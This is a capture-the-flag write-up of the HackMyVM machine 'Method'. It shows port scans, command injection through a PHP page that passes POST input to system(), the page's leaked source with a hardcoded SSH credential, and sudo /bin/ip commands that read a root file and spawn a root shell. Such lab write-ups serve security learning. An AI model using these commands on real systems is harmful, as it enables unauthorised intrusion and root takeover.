---
layout: post
author: canarinho
title:  "Method"
date:   2021-12-31 09:30:26 AM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Method)

## Scanning n Fuzzing

{% highlight bash %}
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2021-12-15 19:20 -03
Nmap scan report for method (192.168.15.93)
Host is up (0.0025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 4b:24:34:1f:41:10:88:b7:5a:6a:63:d9:f6:75:26:6f (RSA)
|   256 52:46:e7:20:68:c1:6f:90:2f:a6:ad:ee:6d:87:e7:28 (ECDSA)
|_  256 3f:ce:97:a9:1e:f4:60:f4:0e:71:e7:46:58:28:71:f0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Test Page for the Nginx HTTP Server on Fedora
|_http-server-header: nginx/1.18.0
OSVDB-3092: /sitemap.xml: This gives a nice listing of the site content.
{% endhighlight %}

{% highlight bash %}
+ OSVDB-3092: /sitemap.xml: This gives a nice listing of the site content.
+ OSVDB-3092: /www/: This might be interesting...
+ OSVDB-5692: /oekaki/: The PaintBBS Server may allow unauthorized access to the config files.
{% endhighlight %}

## Testing POST as method to see what hapeens

{% highlight bash %}
curl -X POST '<http://192.168.15.93/secret.php>' -d 'HackMyVM=id' -H 'Content-Type: application/x-www-form-urlencoded'

//the return
You Found ME : - (<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>

{% endhighlight %}

## Trying to understand what's happening...

{% highlight bash %}
curl -X POST '<http://192.168.15.93/secret.php>' -d 'HackMyVM=cat secret.php' -H 'Content-Type: application/x-www-form-urlencoded'

//the return
You Found ME : - (<pre><?php
if(isset($_GET['HackMyVM'])){
        echo "Now the main part what it is loooooool";
        echo "<br>";
echo "Try other method";
        die;
}
if(isset($_POST['HackMyVM'])){
        echo "You Found ME : - (";
        echo "<pre>";
        $cmd = ($_POST['HackMyVM']);
        system($cmd);
        echo "</pre>";
        die;
}
else {
header("Location: <https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg>");
}
$ok="prakasaka:th3-!llum!n@t0r";
?>
</pre>

{% endhighlight %}

And there it is, we got creds to login via ssh.

## Privesc

{% highlight bash %}
User prakasaka may run the following commands on method:
    (!root) NOPASSWD: /bin/bash
    (root) /bin/ip

{% endhighlight %}

Searching for exploits using "ip" command, we got that

{% highlight bash %}
//to read a specific file
LFILE=/root/rOot.txt
sudo /bin/ip -force -batch "$LFILE"

//to get shell as root
sudo /bin/ip netns add foo
sudo /bin/ip netns exec foo /bin/sh
sudo /bin/ip netns delete foo

{% endhighlight %}